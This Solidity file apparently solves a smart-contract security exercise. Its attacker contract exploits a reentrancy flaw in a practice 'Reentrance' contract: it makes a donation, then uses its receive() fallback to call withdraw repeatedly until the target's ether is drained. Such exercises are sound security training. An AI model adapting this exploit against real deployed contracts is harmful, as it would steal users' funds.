// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// import { console } from "forge-std/console.sol";
import { Reentrance } from "src/Reentrancy/Reentrance.sol";

contract ReentranceAttack {
    address private targetAddress;
    uint private initialDeposit;
    function attack(address _targetAddress) public payable {
        // store target for use in recieve()
        targetAddress = _targetAddress;
        // store withdraw amount to reuse in receive
        initialDeposit = msg.value;
        // perform an initial donate so that we can get past the balance check on Reentrance.withdraw(); 
        Reentrance(payable(targetAddress)).donate{value: initialDeposit}(address(this));
        // execute withdraw that will trigger repeated withdraws until target contract is drained
        withdrawAll();
    }

    // receive fallback will be called by Reentrance.withdraw() function before it reduces our balance,
    // so we will call repetitive withdraws until they run out of money 😈
    receive() external payable {
        // return if we have exhausted the targetAddress balance
        if (targetAddress.balance == 0) return;
        // thanks for the ether, but we want it all!!
        withdrawAll();
        
    }

    function withdrawAll() private {
        // get the modulo of the target balance to our initial deposit
        uint moduloBalance = targetAddress.balance % initialDeposit;

        // console.logString("targetBalance");
        // console.log(targetAddress.balance);

        // to prevent underflowing, remove the modulo amount first, 
        // and then callWithdraw of the initialDeposit until depleted.
        moduloBalance > 0 ? callWithdraw(moduloBalance) : callWithdraw(initialDeposit);

    }

    function callWithdraw(uint _amount) private {
        Reentrance(payable(targetAddress)).withdraw(_amount);
    }
}